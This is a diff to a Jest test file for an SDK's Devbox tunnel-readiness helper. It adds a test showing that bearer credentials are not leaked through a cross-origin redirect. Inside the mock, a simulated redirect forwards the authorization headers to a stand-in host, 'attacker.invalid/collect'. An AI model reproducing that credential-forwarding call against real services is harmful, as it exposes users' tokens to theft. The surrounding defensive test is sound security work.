@@ -1,6 +1,7 @@
 import { Devbox } from '../../../src/sdk/devbox';
 import { InternalServerError } from '../../../src/error';
-import { Response } from 'node-fetch';
+import { Runloop } from '../../../src';
+import { Headers, Response, type RequestInfo, type RequestInit } from 'node-fetch';
 
 describe('object-oriented tunnel readiness', () => {
   test('net helper requests the optional health path through the established tunnel', async () => {
@@ -40,10 +41,67 @@ describe('object-oriented tunnel readiness', () => {
       expect.objectContaining({
         maxRetries: 0,
         signal,
+        redirect: 'error',
         headers: { authorization: 'Bearer tunnel-token' },
       }),
     );
     expect(asResponse).toHaveBeenCalledTimes(1);
+  });
+
+  test('does not send API or tunnel credentials to a cross-origin redirect', async () => {
+    const calls: Array<{ url: string; authorization: string | null; redirect: string | undefined }> = [];
+    const fetch = jest.fn(async (request: RequestInfo, init?: RequestInit): Promise<Response> => {
+      const url = request.toString();
+      const authorization = new Headers(init?.headers).get('authorization');
+      calls.push({ url, authorization, redirect: init?.redirect });
+
+      if (url === 'https://api.runloop.ai/v1/devboxes/dbx') {
+        return new Response(
+          JSON.stringify({
+            id: 'dbx',
+            tunnel: {
+              tunnel_key: 'tunnel-key',
+              auth_mode: 'authenticated',
+              auth_token: 'tunnel-token',
+            },
+          }),
+          { headers: { 'content-type': 'application/json' } },
+        );
+      }
+      if (url === 'https://8080-tunnel-key.tunnel.runloop.ai/health') {
+        if (init?.redirect === 'error') {
+          throw new TypeError('Redirect mode is set to error');
+        }
+        return fetch('https://attacker.invalid/collect', init);
+      }
+      return new Response('captured', { status: 200 });
+    });
+    const client = new Runloop({
+      bearerToken: 'api-bearer',
+      baseURL: 'https://api.runloop.ai',
+      maxRetries: 0,
+      fetch: fetch as any,
+    });
+    const devbox = Devbox.fromId(client, 'dbx');
+
+    await expect(
+      devbox.awaitTunnelReady(8080, { path: '/health', timeoutMs: 1_000 }),
+    ).rejects.toBeDefined();
+
+    expect(calls).toEqual([
+      {
+        url: 'https://api.runloop.ai/v1/devboxes/dbx',
+        authorization: 'Bearer api-bearer',
+        redirect: undefined,
+      },
+      {
+        url: 'https://8080-tunnel-key.tunnel.runloop.ai/health',
+        authorization: 'Bearer tunnel-token',
+        redirect: 'error',
+      },
+    ]);
+    expect(calls.some((call) => call.url === 'https://attacker.invalid/collect')).toBe(false);
+    expect(calls[1]?.authorization).not.toBe('Bearer api-bearer');
   });
 
   test('Devbox helper delegates to its network operations', async () => {
